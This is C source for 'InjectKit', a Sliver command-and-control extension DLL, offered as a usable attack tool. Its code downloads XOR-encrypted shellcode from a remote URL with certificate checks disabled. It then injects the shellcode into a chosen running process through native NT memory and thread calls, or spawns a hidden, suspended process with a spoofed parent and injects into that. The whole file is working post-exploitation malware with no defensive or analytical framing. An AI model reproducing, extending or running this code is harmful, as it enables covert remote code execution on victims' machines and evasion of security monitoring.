/*
 * InjectKit Extension DLL — inject.x64.dll
 *
 * Sliver Extension entry point: GoExtensionArgs(data, len, cb)
 *
 * Wire protocol (space-separated args string from Sliver):
 *   url=https://...          — HTTPS URL serving XOR-encrypted shellcode
 *   key=<64 hex chars>       — 32-byte XOR key (hex-encoded)
 *   target=<process.exe>     — inject into this running process
 *   spawn=<process.exe>      — spawn this process instead (mutually exclusive with target)
 *   ppid=<process.exe>       — spoof this as parent when spawning (default: explorer.exe)
 *
 * Execution chain (target= mode):
 *   1. Parse args
 *   2. WinHTTP HTTPS fetch + XOR-32 decrypt
 *   3. Find target PID via TH32CS snapshot
 *   4. NtOpenProcess → get handle
 *   5. NtAllocateVirtualMemory(RW, remote) → NtWriteVirtualMemory → NtProtectVirtualMemory(RX)
 *   6. NtCreateThreadEx in remote process
 *   7. callback("injected into <process> (pid <N>)")
 *
 * Execution chain (spawn= mode):
 *   1–3. Same
 *   4. Find ppid process PID
 *   5. OpenProcess(PROCESS_CREATE_PROCESS) → InitializeProcThreadAttributeList →
 *      UpdateProcThreadAttribute(PARENT_PROCESS) → CreateProcessW(CREATE_SUSPENDED)
 *   6. Remote inject into new process via NtAllocVM/NtWriteVM/NtProtectVM/NtCreateThreadEx
 *   7. callback("spawned <process> (pid <N>) with ppid spoofed to <ppid>; injected")
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ── Sliver Extension ABI ─────────────────────────────────────────────── */
#define CALLBACK_OUTPUT 0x0d
#define CALLBACK_ERROR  0x0e
typedef void (*callback_fn)(uint8_t *data, uint32_t len, uint32_t id);

__declspec(dllexport)
void GoExtensionArgs(uint8_t *data, uint32_t len, callback_fn cb);

/* ── NT type definitions ──────────────────────────────────────────────── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} OBJECT_ATTRIBUTES_EX;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_EX;

typedef NTSTATUS (WINAPI *NtOpenProcess_t)(
    PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_EX *, CLIENT_ID_EX *);
typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (WINAPI *NtWriteVirtualMemory_t)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (WINAPI *NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* ── WinHTTP (same pattern as LoadKit) ───────────────────────────────── */
typedef LPVOID HINTERNET;
typedef WORD   INTERNET_PORT;
typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL (WINAPI *WinHttpSetOption_t)(HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI *WinHttpSendRequest_t)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *WinHttpReceiveResponse_t)(HINTERNET,LPVOID);
typedef BOOL (WINAPI *WinHttpQueryDataAvailable_t)(HINTERNET,LPDWORD);
typedef BOOL (WINAPI *WinHttpReadData_t)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *WinHttpCloseHandle_t)(HINTERNET);

#define WINHTTP_ACCESS_TYPE_NO_PROXY    1
#define WINHTTP_NO_PROXY_NAME           NULL
#define WINHTTP_NO_PROXY_BYPASS         NULL
#define WINHTTP_FLAG_SECURE             0x00800000
#define WINHTTP_OPTION_SECURITY_FLAGS   31
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS 0x00003100

/* ── helpers ──────────────────────────────────────────────────────────── */
static uint8_t hex_nibble(char c) {
    if (c>='0'&&c<='9') return (uint8_t)(c-'0');
    if (c>='a'&&c<='f') return (uint8_t)(c-'a'+10);
    if (c>='A'&&c<='F') return (uint8_t)(c-'A'+10);
    return 0;
}
static int hex_decode(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex)!=len*2) return 0;
    for (size_t i=0;i<len;i++)
        out[i]=(uint8_t)((hex_nibble(hex[i*2])<<4)|hex_nibble(hex[i*2+1]));
    return 1;
}

static int parse_url(const char *url, wchar_t *host, size_t hsz,
                     INTERNET_PORT *port, wchar_t *path, size_t psz) {
    const char *p = url;
    if (strncmp(p,"https://",8)==0) p+=8;
    else if (strncmp(p,"http://",7)==0) p+=7;
    else return 0;
    const char *hs=p, *colon=NULL, *slash=NULL;
    while (*p&&*p!='/') { if(*p==':') colon=p; p++; }
    slash=p;
    if (colon) {
        *port=(INTERNET_PORT)atoi(colon+1);
        MultiByteToWideChar(CP_ACP,0,hs,(int)(colon-hs),host,(int)hsz);
        host[colon-hs]=L'\0';
    } else {
        *port=443;
        MultiByteToWideChar(CP_ACP,0,hs,(int)(slash-hs),host,(int)hsz);
        host[slash-hs]=L'\0';
    }
    if (*slash) MultiByteToWideChar(CP_ACP,0,slash,-1,path,(int)psz);
    else { path[0]=L'/'; path[1]=L'\0'; }
    return 1;
}

static uint8_t *winhttp_fetch(const char *url, DWORD *out_len) {
    HMODULE hWH = LoadLibraryA("winhttp.dll");
    if (!hWH) return NULL;
#define LOAD(n) n##_t fn_##n=(n##_t)GetProcAddress(hWH,#n)
    LOAD(WinHttpOpen); LOAD(WinHttpConnect); LOAD(WinHttpOpenRequest);
    LOAD(WinHttpSetOption); LOAD(WinHttpSendRequest); LOAD(WinHttpReceiveResponse);
    LOAD(WinHttpQueryDataAvailable); LOAD(WinHttpReadData); LOAD(WinHttpCloseHandle);
#undef LOAD
    wchar_t whost[256]={0}, wpath[512]={0};
    INTERNET_PORT port=443;
    if (!parse_url(url,whost,256,&port,wpath,512)) { FreeLibrary(hWH); return NULL; }
    uint8_t *buf=NULL; DWORD total=0;
    HINTERNET hS=NULL,hC=NULL,hR=NULL;
    hS=fn_WinHttpOpen(L"InjectKit/1.0",WINHTTP_ACCESS_TYPE_NO_PROXY,
                      WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
    if (!hS) goto cleanup;
    hC=fn_WinHttpConnect(hS,whost,port,0); if (!hC) goto cleanup;
    hR=fn_WinHttpOpenRequest(hC,L"GET",wpath,NULL,NULL,NULL,WINHTTP_FLAG_SECURE);
    if (!hR) goto cleanup;
    DWORD sf=SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    fn_WinHttpSetOption(hR,WINHTTP_OPTION_SECURITY_FLAGS,&sf,sizeof(sf));
    if (!fn_WinHttpSendRequest(hR,NULL,0,NULL,0,0,0)) goto cleanup;
    if (!fn_WinHttpReceiveResponse(hR,NULL)) goto cleanup;
    for (;;) {
        DWORD av=0;
        if (!fn_WinHttpQueryDataAvailable(hR,&av)||av==0) break;
        buf=(uint8_t*)realloc(buf,total+av);
        if (!buf) goto cleanup;
        DWORD rd=0;
        if (!fn_WinHttpReadData(hR,buf+total,av,&rd)) break;
        total+=rd;
    }
cleanup:
    if (hR) fn_WinHttpCloseHandle(hR);
    if (hC) fn_WinHttpCloseHandle(hC);
    if (hS) fn_WinHttpCloseHandle(hS);
    FreeLibrary(hWH);
    *out_len=total;
    return buf;
}

/* ── process utilities ────────────────────────────────────────────────── */
static DWORD find_pid(const char *name) {
    wchar_t wname[MAX_PATH]={0};
    MultiByteToWideChar(CP_ACP,0,name,-1,wname,MAX_PATH);
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe={.dwSize=sizeof(pe)};
    DWORD pid=0;
    if (Process32FirstW(snap,&pe)) do {
        if (_wcsicmp(pe.szExeFile,wname)==0) { pid=pe.th32ProcessID; break; }
    } while (Process32NextW(snap,&pe));
    CloseHandle(snap);
    return pid;
}

/* ── NT remote injection ──────────────────────────────────────────────── */
static NTSTATUS remote_inject(HANDLE hProc, uint8_t *sc, SIZE_T sz) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    NtAllocateVirtualMemory_t NtAllocVM =
        (NtAllocateVirtualMemory_t)GetProcAddress(hNt,"NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t NtWriteVM =
        (NtWriteVirtualMemory_t)GetProcAddress(hNt,"NtWriteVirtualMemory");
    NtProtectVirtualMemory_t NtProtVM =
        (NtProtectVirtualMemory_t)GetProcAddress(hNt,"NtProtectVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx =
        (NtCreateThreadEx_t)GetProcAddress(hNt,"NtCreateThreadEx");
    if (!NtAllocVM||!NtWriteVM||!NtProtVM||!NtCreateThreadEx) return -1;

    PVOID base=NULL; SIZE_T size=sz;
    NTSTATUS s=NtAllocVM(hProc,&base,0,&size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!NT_SUCCESS(s)) return s;
    SIZE_T written=0;
    s=NtWriteVM(hProc,base,sc,sz,&written);
    if (!NT_SUCCESS(s)) return s;
    ULONG old=0; SIZE_T psize=sz;
    s=NtProtVM(hProc,&base,&psize,PAGE_EXECUTE_READ,&old);
    if (!NT_SUCCESS(s)) return s;
    HANDLE hThread=NULL;
    s=NtCreateThreadEx(&hThread,0x1FFFFF,NULL,hProc,base,NULL,0,0,0,0,NULL);
    if (hThread) CloseHandle(hThread);
    return s;
}

/* ── PPID-spoofed process spawn ──────────────────────────────────────── */
static HANDLE spawn_spoofed(const char *target_exe, DWORD parent_pid,
                             DWORD *new_pid) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) return NULL;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL,1,0,&attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attr =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,attr_sz);
    InitializeProcThreadAttributeList(attr,1,0,&attr_sz);
    UpdateProcThreadAttribute(attr,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent,sizeof(HANDLE),NULL,NULL);
    CloseHandle(hParent);

    wchar_t wexe[MAX_PATH]={0};
    MultiByteToWideChar(CP_ACP,0,target_exe,-1,wexe,MAX_PATH);

    STARTUPINFOEXW si={0};
    si.StartupInfo.cb=sizeof(si);
    si.StartupInfo.dwFlags=STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow=SW_HIDE;
    si.lpAttributeList=attr;

    PROCESS_INFORMATION pi={0};
    BOOL ok=CreateProcessW(wexe,NULL,NULL,NULL,FALSE,
        CREATE_SUSPENDED|EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
        NULL,NULL,(LPSTARTUPINFOW)&si,&pi);
    HeapFree(GetProcessHeap(),0,attr);
    if (!ok) return NULL;
    CloseHandle(pi.hThread);
    *new_pid=pi.dwProcessId;
    return pi.hProcess;
}

/* ── GoExtensionArgs entry point ─────────────────────────────────────── */
__declspec(dllexport)
void GoExtensionArgs(uint8_t *data, uint32_t len, callback_fn cb) {
    char buf[2048]={0};
    if (len>=sizeof(buf)) len=sizeof(buf)-1;
    memcpy(buf,data,len);

    char url[512]={0}, key_hex[65]={0};
    char target[MAX_PATH]={0}, spawn_exe[MAX_PATH]={0}, ppid_name[MAX_PATH]={0};
    strncpy(ppid_name,"explorer.exe",sizeof(ppid_name)-1);

    char *tok=strtok(buf," \t");
    while (tok) {
        if      (!strncmp(tok,"url=",4))    snprintf(url,sizeof(url),"%s",tok+4);
        else if (!strncmp(tok,"key=",4))    snprintf(key_hex,sizeof(key_hex),"%s",tok+4);
        else if (!strncmp(tok,"target=",7)) snprintf(target,sizeof(target),"%s",tok+7);
        else if (!strncmp(tok,"spawn=",6))  snprintf(spawn_exe,sizeof(spawn_exe),"%s",tok+6);
        else if (!strncmp(tok,"ppid=",5))   snprintf(ppid_name,sizeof(ppid_name),"%s",tok+5);
        tok=strtok(NULL," \t");
    }

    if (!url[0]||!key_hex[0]) {
        const char *e="injectkit: missing url= or key=";
        cb((uint8_t*)e,(uint32_t)strlen(e),CALLBACK_ERROR); return;
    }
    if (!target[0]&&!spawn_exe[0]) {
        const char *e="injectkit: provide target= or spawn=";
        cb((uint8_t*)e,(uint32_t)strlen(e),CALLBACK_ERROR); return;
    }

    uint8_t xor_key[32]={0};
    if (!hex_decode(key_hex,xor_key,32)) {
        const char *e="injectkit: key= must be 64 hex chars";
        cb((uint8_t*)e,(uint32_t)strlen(e),CALLBACK_ERROR); return;
    }

    DWORD enc_len=0;
    uint8_t *enc=winhttp_fetch(url,&enc_len);
    if (!enc||!enc_len) {
        const char *e="injectkit: WinHTTP fetch failed";
        cb((uint8_t*)e,(uint32_t)strlen(e),CALLBACK_ERROR);
        free(enc); return;
    }
    for (DWORD i=0;i<enc_len;i++) enc[i]^=xor_key[i%32];

    char result[1024]={0};
    NTSTATUS s;

    if (spawn_exe[0]) {
        /* spawn mode */
        DWORD ppid=find_pid(ppid_name);
        if (!ppid) {
            snprintf(result,sizeof(result),"injectkit: ppid process '%s' not found",ppid_name);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
            free(enc); return;
        }
        DWORD new_pid=0;
        HANDLE hProc=spawn_spoofed(spawn_exe,ppid,&new_pid);
        if (!hProc) {
            snprintf(result,sizeof(result),"injectkit: failed to spawn '%s'",spawn_exe);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
            free(enc); return;
        }
        s=remote_inject(hProc,enc,enc_len);
        CloseHandle(hProc);
        free(enc);
        if (!NT_SUCCESS(s)) {
            snprintf(result,sizeof(result),"injectkit: inject failed (0x%08lx)",s);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
        } else {
            snprintf(result,sizeof(result),
                "[+] spawned %s (pid %lu) with ppid spoofed to %s — shellcode running",
                spawn_exe,new_pid,ppid_name);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_OUTPUT);
        }
    } else {
        /* target mode */
        DWORD pid=find_pid(target);
        if (!pid) {
            snprintf(result,sizeof(result),"injectkit: target process '%s' not found",target);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
            free(enc); return;
        }
        HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
        if (!hProc) {
            snprintf(result,sizeof(result),"injectkit: OpenProcess(pid %lu) failed",pid);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
            free(enc); return;
        }
        s=remote_inject(hProc,enc,enc_len);
        CloseHandle(hProc);
        free(enc);
        if (!NT_SUCCESS(s)) {
            snprintf(result,sizeof(result),"injectkit: inject failed (0x%08lx)",s);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_ERROR);
        } else {
            snprintf(result,sizeof(result),
                "[+] injected into %s (pid %lu) — shellcode running",target,pid);
            cb((uint8_t*)result,(uint32_t)strlen(result),CALLBACK_OUTPUT);
        }
    }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    (void)h;(void)r;(void)l; return TRUE;
}
